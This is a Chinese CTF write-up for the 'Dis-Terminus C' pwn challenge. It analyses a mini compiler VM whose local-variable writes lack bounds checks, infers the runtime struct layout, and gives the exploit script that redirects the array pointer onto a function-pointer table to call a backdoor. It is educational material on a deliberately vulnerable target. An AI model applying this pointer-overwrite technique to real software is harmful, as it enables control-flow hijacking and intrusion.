---
title: "Dis-Terminus C"
published: 2026-10-24
description: "分析迷你编译器的虚拟机，通过越界写修改数组指针与函数指针。"
tags: ["CTF", "Mini 2025", "Pwn", "虚拟机", "越界写"]
category: "CTF Writeup"
draft: false
lang: "zh_CN"
---

> 本文整理自 Mini 2025 WP 笔记。Flag 与服务器地址、连接端口已脱敏；远程连接代码中的占位符需替换后使用。

>[**数据删除**]写了一个迷你编译器，支持五条指令：
>
>1. `let x = 数字;` | 声明一个变量，值只能是整数常量 | `let a = 123;` / `let b = 0x401000;`
>2. `arr[下标] = 数字;` | 向数组写入一个值 | `arr[0] = 0x1337;`
>3. `print(数字);` | 打印一个数字 | `print(42);`
>4. `debug(数字);` | 查看 locals 某个 slot 的值 | `debug(0);`
>5. ？？？？
>
  输入完毕后在最后一行发送 `EOF`结束，`EXIT`退出。程序会自动编译并执行。
>
 `#` 开头为注释，可以用`./baby-compiler --help` 查看语法。
>
**pwn it is all you need.**

## 分析
本题提供了远端的环境的部分文件以及二进制文件的部分源代码：
```c
/*
 * You've been given the compiler and VM logic.
 * Some constants and functions are intentionally redacted. Find them.
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


typedef enum { VAL_INT = 1 } ValueType;

typedef struct {
    uint64_t as_u64;
    uint64_t type;
} Value;

typedef struct {
    size_t len;
    size_t cap;
    Value *items;
} ObjArray;

typedef void (*NativeFn)(/* ... */);

/*
 * Runtime struct — the sizes are REDACTED by [REDACTED].
 * Use `--dump-bytecode` and `debug(N)` to figure them out.
 */
typedef struct Runtime {
    Value   locals[???];
    ObjArray arr;
    Value   arr_items[???];
    NativeFn natives[???];
} Runtime;

typedef enum {
    OP_CONST_U64 = 1,
    OP_SET_LOCAL = 2,
    OP_ARRAY_SET = 3,
    OP_PRINT     = 4,
    OP_HALT      = 5,
    OP_DEBUG     = 6,
    OP_CREDITS   = 7
} OpCode;

/* ==================== compiler — full source ==================== */

static void emit_byte(/* ... */);
static void emit_qword(/* ... */);
static uint64_t parse_number(/* ... */);

static void compile_let(/* Compiler *c, char *line */) {
    /*
     * Allocates a new slot: c->local_count++
     * Slot number becomes the operand of OP_SET_LOCAL.
     * The compiler allows up to COMPILER_MAX_LOCALS variables.
     * How many is that?.
     */
    uint8_t slot = c->local_count++;
    emit_byte(OP_CONST_U64);  emit_qword(value);
    emit_byte(OP_SET_LOCAL);  emit_byte(slot);
}

static void compile_array_set(/* Compiler *c, char *line */) {
    emit_byte(OP_CONST_U64);  emit_qword(value);
    emit_byte(OP_ARRAY_SET);  emit_qword(index);
}

static void compile_print(/* Compiler *c, char *line */) {
    emit_byte(OP_CONST_U64);  emit_qword(value);
    emit_byte(OP_PRINT);
}

static void compile_debug(/* Compiler *c, char *line */) {
    emit_byte(OP_DEBUG);  emit_byte(slot);
}

/* ==================== VM — full source ==================== */

static void run(Runtime *runtime, /* Chunk *chunk */) {
    Value accumulator = {0};
    for (;;) {
        uint8_t op = /* read next byte */;
        switch (op) {
        case OP_SET_LOCAL: {
            uint8_t slot = /* read slot */;
            runtime->locals[slot] = accumulator;     // <-- NO BOUNDS CHECK
            break;
        }
        case OP_ARRAY_SET: {
            uint64_t index = /* read index */;
            if (index >= runtime->arr.len)
                fatal("array index out of bounds");
            runtime->arr.items[index] = accumulator; // <-- write through pointer
            break;
        }
        case OP_DEBUG: {
            uint8_t slot = /* read slot */;
            printf("[debug] locals[%u] = %lu\n", slot,
                   runtime->locals[slot].as_u64);
            break;
        }
        case OP_PRINT:
            runtime->natives[0](runtime, accumulator); // <-- indirect call
            break;
        case OP_CREDITS:
            runtime->natives[1]( /* ... */ );
            break;
        case OP_HALT:
            return;
        }
    }
}

```

```yaml
version: "3.8"
services:
  baby-compiler:
    build: .
    ports:
      - "9999:9999"
    environment:
      - FLAG=[FLAG REDACTED]
    restart: unless-stopped
```

```bash
#!/bin/bash
echo "${FLAG:-[FLAG REDACTED]}" > /chall/flag.txt
exec socat TCP-LISTEN:80,reuseaddr,fork EXEC:./baby-compiler,stderr
```

通过分析大概可以看出，远端容器将flag放在`/chall/flag.txt`内，而提供给我们的“编译器”的功能大概是将代码翻译成字节码，然后交由内部的执行虚拟机翻译成指令。而源代码隐藏了一部分参数，比如分配的局部变量和数组变量的实际大小。

从Value的结构体定义能看出一个Value占16个字节，含有值和类型

从源代码大概可以看出几条指令的实际操作：
- `let x = 数字;`  | 向Local变量栈中推入数字，实际上这个x根本没有用，只是填了一个数字
- arr[下标] = 数字; | 向分配的arr_items的下标位置写入数字
- print(数字) | 打印数字，数字只能是常量，而不能是arr[1]，x之类的表达，实际上是调用natives[0]处的函数，那么那个位置的函数指针应该是输出用的
- debug(数字) | 可以查看local变量的值
- ？

而其中运行时的数据存在一个叫Runtime的结构体中
```c
typedef struct Runtime {
    Value   locals[???];
    ObjArray arr;
    Value   arr_items[???];
    NativeFn natives[???];
} Runtime;
```

因此内存上的布局大概是`16字节的Locals*??? -> 8字节的数组长度 -> 8字节的数组栈顶指针 -> 8字节的数组指针 -> 16字节的数组元素*??? -> 8字节的函数指针 * ???`

## 测试
首先，知道locals后面就是数组长度和数组指针那些，而程序每次运行结束后都会输出目前数组指针的位置，因此，我们可以通过测试分配多少个变量能修改到后面的数组指针，来查看从locals[0]到数组指针的位置，从而推算Locals的实际大小

通过测试，当我们执行了18个let语句的时候，输出的数组数组指针位置才会产生变化，这说明，在数组指针前面有`17*16`个字节，从而可以推算出locals实际上有16个，我们创建一个新实例查看索引为16的locals的值也能看出来第17个元素是ObjArray arr的位置:`[debug] locals[16] = 8  <-- this overlaps arr fields!`

因此，第一个???就是16。

然后如果我们想要看arr_items实际上有几个，我们可以试着看到多少个的时候会覆盖到natives，导致print执行失败。不过试了才发现arr[8]赋值的时候程序直接以Out of bounds为由拒绝操作，所以合理推测第二个???是8

因此，
```c
typedef struct Runtime {
    Value   locals[16];
    ObjArray arr;
    Value   arr_items[8];
    NativeFn natives[???];
} Runtime;
```
这样就弄清楚了。

所以，如果我们想要修改natives[0]，可以推算一下以16为步长的话，到达natives的时候实际上为locals[25]，并且不巧的是覆盖到natives[0]的部分是Value的类型部分，我们无法控制它的值，我们可以控制natives[1]，不过我们不知道OP_CREDITS如何触发，因此，我们可以换一条路径，我们可以修改arr中的item指针的值，让它指向后面的的位置（偏移量0x80），从而指向native[0]，再使用arr[0]修改它的值。恰好有个backdoor函数位于0x402079。

## 实操
运行时`arr_items @ 0x31ac1128`，以此推算出需要改到的位置，然后构建输入内容
```zsh
❯ nc HOST_REDACTED PORT_REDACTED

========================================
       Baby Compiler v1.0
========================================
  arr_items @ 0x364e3b8
========================================

>>> [attempt #1] script (EOF to run, EXIT to quit):
let a = 1
let a = 1
let a = 1
let a = 1
let a = 1
let a = 1
let a = 1
let a = 1
let a = 1
let a = 1
let a = 1
let a = 1
let a = 1
let a = 1
let a = 1
let a = 1
let a = 8
let a = 0x364e438
arr[0] = 0x402079
print(42)
EOF
[*] compiling...
[*] compiled 227 bytes
[*] running...

========================================
    You found the backdoor!
========================================

flag: [FLAG REDACTED]
[*] done
```
